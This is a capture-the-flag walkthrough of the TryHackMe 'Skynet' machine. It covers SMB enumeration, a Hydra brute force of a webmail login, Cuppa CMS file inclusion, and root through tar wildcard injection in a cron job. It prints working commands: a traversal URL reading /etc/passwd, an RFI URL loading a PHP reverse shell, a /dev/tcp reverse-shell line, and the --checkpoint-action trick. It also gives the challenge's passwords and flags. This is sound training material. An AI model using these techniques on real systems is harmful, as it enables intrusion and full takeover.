# Skynet — TryHackMe Walkthrough

> A vulnerable Terminator themed Linux machine. Are you able to compromise it?

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/78628bbf76bf1992a8420cdb43e59f2d.jpeg" />
</p>

<p align="center">
  <a href="https://tryhackme.com/room/skynet">
    <img src="https://img.shields.io/badge/TryHackMe-Skynet-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-SMB%20%7C%20Brute%20Force%20%7C%20LFI%20%7C%20Crontab-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Enumeration |
| 3 | SMB Enumeration |
| 4 | Brute Forcing (http-post-form) |
| 5 | Local File Inclusion / Remote File Inclusion |
| 6 | Directory Traversal |
| 7 | Exploiting Crontab |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Identify and enumerate SMB shares on a Linux target
- Use Hydra to brute-force a web login form with a custom wordlist
- Read emails from a webmail client to extract credentials
- Enumerate hidden directories discovered through SMB notes
- Exploit a Local/Remote File Inclusion vulnerability in Cuppa CMS
- Analyse a cron job running as root and abuse `tar` wildcard injection for privilege escalation

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, Gobuster, Hydra, smbclient, and Netcat installed

---

## Task 1 — Deploy and Compromise the Machine

---

### Step 1 — Network Enumeration

**Approach:** Run an Nmap scan with service detection and default scripts to identify all open ports and services on the target.

```
kali@kali:~/CTFs/tryhackme/Skynet$ sudo nmap -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 11:13 CEST
Nmap scan report for Machine_IP
Host is up (0.039s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL TOP AUTH-RESP-CODE UIDL RESP-CODES PIPELINING CAPA
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: SASL-IR Pre-login LITERAL+ have OK post-login LOGIN-REFERRALS ID listed capabilities more LOGINDISABLEDA0001 IDLE IMAP4rev1 ENABLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|_  System time: 2020-10-13T04:13:54-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.80 seconds
```

> **Note:** Six ports are open. Of particular interest are **port 445 (SMB/Samba)** — which may expose file shares accessible without authentication — and **port 80 (HTTP)** where the web application lives. Ports 110 (POP3) and 143 (IMAP) indicate a mail server is running, which ties into the SquirrelMail webmail application we will discover shortly.

---

### Step 2 — SMB Share Enumeration

**Approach:** Use `smbclient` with the `-L` flag to list all available shares on the target without providing a password (anonymous access).

```
kali@kali:~/CTFs/tryhackme/Skynet$ smbclient -L Machine_IP
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

> **Note:** Four shares are listed. The `anonymous` share allows unauthenticated access — always test this first. The `milesdyson` share is a personal share requiring credentials. `IPC$` is an inter-process communication share used internally by Windows/Samba and is not useful here. Connect to the `anonymous` share with `smbclient //Machine_IP/anonymous` and press Enter when prompted for a password.

---

### Step 3 — Web Enumeration with Gobuster

**Approach:** While enumerating SMB, also run Gobuster against the web server in parallel to discover hidden directories.

```
kali@kali:~/CTFs/tryhackme/Skynet$ gobuster dir -u Machine_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://Machine_IP
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/13 11:14:13 Starting gobuster
===============================================================
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail (Status: 301)
/server-status (Status: 403)
===============================================================
2020/10/13 11:22:16 Finished
===============================================================
```

> **Note:** The most significant discovery is `/squirrelmail` — a web-based email client. This will be the target for brute-forcing once we collect a password list from the SMB share.

---

### Step 4 — Reading the Anonymous SMB Share

**Approach:** Connect to the anonymous share and download its contents — a text file and a directory of logs.

```
kali@kali:~/CTFs/tryhackme/Skynet$ cat attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
kali@kali:~/CTFs/tryhackme/Skynet$ cat logs/log1.txt
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

> **Note:** The `attention.txt` file is signed by **Miles Dyson** — confirming a username. The `logs/log1.txt` file is a list of potential passwords. This is exactly the kind of wordlist needed to brute-force Miles' email login. Always look for log files, backup files, and notes inside SMB shares.

---

### Question 1 — What is Miles' password for his emails?

**Approach:** Use Hydra to brute-force the SquirrelMail login form at `/squirrelmail/src/redirect.php` using the `milesdyson` username and the password list from the SMB share.

```
kali@kali:~/CTFs/tryhackme/Skynet$ hydra -l milesdyson -P logs/log1.txt Machine_IP http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-13 11:23:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://Machine_IP:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.
[80][http-post-form] host: Machine_IP   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-13 11:23:59
```

> **Note:** The Hydra `http-post-form` module takes three colon-separated arguments: the URL path, the POST body parameters with `^USER^` and `^PASS^` as placeholders, and the failure string to detect incorrect login attempts. Hydra successfully cracks the password in under 10 seconds using the 31-password wordlist.

<details>
<summary>Reveal Answer</summary>

**`cyborg007haloterminator`**

</details>

---

### Step 5 — Reading Miles' Emails for SMB Credentials

**Approach:** Log in to SquirrelMail at `http://Machine_IP/squirrelmail` with `milesdyson:cyborg007haloterminator`. Read the inbox — one email contains new SMB credentials.

<p align="center">
  <img src="./2020-10-13_11-25.png" alt="SquirrelMail inbox showing SMB password email" />
</p>

The email contains:

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

> **Note:** The email provides the new SMB password for the `milesdyson` personal share. This is a chained attack — cracking the webmail gave us access to an inbox that contained the next set of credentials. Always read emails and notes thoroughly, as they frequently contain passwords, internal paths, or other sensitive information.

---

### Step 6 — Accessing the milesdyson SMB Share

**Approach:** Use the credentials from the email to connect to the `milesdyson` share and download the `notes/important.txt` file.

```
kali@kali:~/CTFs/tryhackme/Skynet$ smbclient -U milesdyson //Machine_IP/milesdyson
Enter WORKGROUP\milesdyson's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 11:05:47 2019
  ..                                  D        0  Wed Sep 18 05:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 11:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 11:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 11:05:14 2019
  notes                               D        0  Tue Sep 17 11:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 11:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 11:05:14 2019

                9204224 blocks of size 1024. 5361632 blocks available
smb: \> cd notes
smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
```

```
kali@kali:~/CTFs/tryhackme/Skynet$ cat important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

> **Note:** The `important.txt` file reveals a hidden directory: **`/45kra24zxs28v3yd`**. This is a secret path for a beta CMS that would not be discoverable through standard wordlist-based directory brute-forcing.

---

### Question 2 — What is the hidden directory?

<details>
<summary>Reveal Answer</summary>

**`/45kra24zxs28v3yd`**

</details>

---

### Step 7 — Enumerating the Hidden CMS Directory

**Approach:** Run Gobuster against the newly discovered hidden path to find the CMS admin panel.

```
kali@kali:~/CTFs/tryhackme/Skynet$ gobuster dir -u http://Machine_IP/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
===============================================================
[+] Url:            http://Machine_IP/45kra24zxs28v3yd/
===============================================================
2020/10/13 11:31:22 Starting gobuster
===============================================================
/administrator (Status: 301)
===============================================================
2020/10/13 11:32:06 Finished
===============================================================
```

> **Note:** An `/administrator` panel is discovered under the hidden path. Navigating to `http://Machine_IP/45kra24zxs28v3yd/administrator/` reveals a **Cuppa CMS** login page. Cuppa CMS has a well-documented Local/Remote File Inclusion vulnerability listed on Exploit-DB.

<p align="center">
  <img src="./2020-10-13_11-33.png" alt="Cuppa CMS administrator login page" />
</p>

---

### Question 3 — What is the vulnerability called when you can include a remote file for malicious purposes?

> **Note:** The Cuppa CMS vulnerability ([Exploit-DB #25971](https://www.exploit-db.com/exploits/25971)) allows an unauthenticated attacker to pass a URL or file path into the `urlConfig` parameter of `alertConfigField.php`. When a remote URL is passed, it fetches and executes that file — this is **Remote File Inclusion (RFI)**. When a local path is used (e.g., `../../../etc/passwd`), it is **Local File Inclusion (LFI)**.

**LFI proof** — reading `/etc/passwd` via directory traversal:

```
view-source:http://Machine_IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

The response embeds the full `/etc/passwd` file inside the page HTML, confirming the vulnerability:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
...
```

<details>
<summary>Reveal Answer</summary>

**`remote file inclusion`**

</details>

---

### Step 8 — Exploiting RFI to Get a Reverse Shell

**Approach:** Host a PHP reverse shell on your attack machine using Python's HTTP server. Pass the URL to the `urlConfig` parameter to trigger Remote File Inclusion and execute the shell on the target.

Serve the PHP reverse shell:

```
python3 -m http.server 80
```

Trigger the RFI by visiting:

```
http://Machine_IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://YOUR_IP/php-reverse-shell.php
```

```
kali@kali:~/CTFs/tryhackme/Skynet$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [Machine_IP] 53188
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 04:37:47 up 25 min,  0 users,  load average: 0.00, 0.00, 0.04
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ cd /home/milesdyson
$ cat user.txt
7ce5c2109a40f958099283600a9ae807
```

> **Note:** The shell connects as `www-data`. The user flag is readable because `user.txt` has world-read permissions (`-rw-r--r--`). Upgrade to a proper interactive shell with `python -c 'import pty; pty.spawn("/bin/bash")'` before proceeding with privilege escalation.

---

### Question 4 — What is the user flag?

<details>
<summary>Reveal Answer</summary>

**`7ce5c2109a40f958099283600a9ae807`**

</details>

---

### Step 9 — Privilege Escalation via Crontab and tar Wildcard Injection

**Approach:** After upgrading the shell, navigate to `/home/milesdyson/backups/` and examine the `backup.sh` script and `/etc/crontab` to understand the scheduled task.

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@skynet:/home/milesdyson$ cd backups
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

> **Note:** The cron job runs `backup.sh` as **root every minute** (`*/1 * * * *`). The script runs `tar cf backup.tgz *` inside `/var/www/html`. The `*` wildcard is the critical weakness — when `tar` expands the wildcard, any filenames beginning with `--` are interpreted as command-line flags. This is a **tar wildcard injection** attack. By creating files named `--checkpoint=1` and `--checkpoint-action=exec=bash shell` alongside a malicious shell script, we trick `tar` into executing our reverse shell as root.

**Exploit execution:**

```
www-data@skynet:/home/milesdyson/backups$ printf '#!/bin/bash\nbash -i >& /dev/tcp/YOUR_IP/9002 0>&1' > /var/www/html/shell
www-data@skynet:/home/milesdyson/backups$ chmod +x /var/www/html/shell
www-data@skynet:/home/milesdyson/backups$ touch /var/www/html/--checkpoint=1
www-data@skynet:/home/milesdyson/backups$ touch /var/www/html/--checkpoint-action=exec=bash\ shell
www-data@skynet:/home/milesdyson/backups$ ls -l /var/www/html
total 64
-rw-rw-rw- 1 www-data www-data     0 Oct 13 04:43 --checkpoint-action=exec=bash shell
-rw-rw-rw- 1 www-data www-data     0 Oct 13 04:43 --checkpoint=1
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data    54 Oct 13 04:42 shell
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
```

---

### Step 10 — Catching the Root Shell and Reading root.txt

**Approach:** Start a second Netcat listener on port 9002. Wait up to one minute for the cron job to trigger. The root shell will connect automatically.

```
kali@kali:~/CTFs/tryhackme/Skynet$ nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.8.106.222] from (UNKNOWN) [Machine_IP] 33774
bash: cannot set terminal process group (2185): Inappropriate ioctl for device
bash: no job control in this shell
root@skynet:/var/www/html# cd
root@skynet:~# ls
root.txt
root@skynet:~# cat root.txt
3f0372db24753accc7179a282cd6a949
```

> **Note:** The root shell connects without any further interaction — the cron job ran `backup.sh` as root, `tar` expanded the wildcard in `/var/www/html`, picked up the `--checkpoint` files as flags, and executed `bash shell` with full root privileges. This is a textbook example of why using wildcards (`*`) in scripts run by privileged users is dangerous.

---

### Question 5 — What is the root flag?

<details>
<summary>Reveal Answer</summary>

**`3f0372db24753accc7179a282cd6a949`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Found 6 open ports including SMB (445), HTTP (80), and mail (110/143) |
| 2 | SMB anonymous share enumeration | Downloaded `attention.txt` and `logs/log1.txt` (password list) |
| 3 | Gobuster on web root | Discovered `/squirrelmail` webmail interface |
| 4 | Hydra http-post-form brute-force | Cracked `milesdyson:cyborg007haloterminator` for SquirrelMail |
| 5 | SquirrelMail inbox inspection | Found new SMB password `)s{A&2Z=F^n_E.B`` in email |
| 6 | milesdyson SMB share access | Downloaded `important.txt` revealing hidden path `/45kra24zxs28v3yd` |
| 7 | Gobuster on hidden path | Discovered Cuppa CMS `/administrator` panel |
| 8 | Cuppa CMS LFI/RFI exploit | Used RFI to load PHP reverse shell, gained `www-data` shell |
| 9 | Read `user.txt` | Found user flag in `/home/milesdyson/` |
| 10 | Crontab inspection | Found `backup.sh` running as root every minute with `tar *` wildcard |
| 11 | tar wildcard injection | Created malicious checkpoint files, triggered root reverse shell via cron |
| 12 | Read `root.txt` | Found root flag in `/root/` |
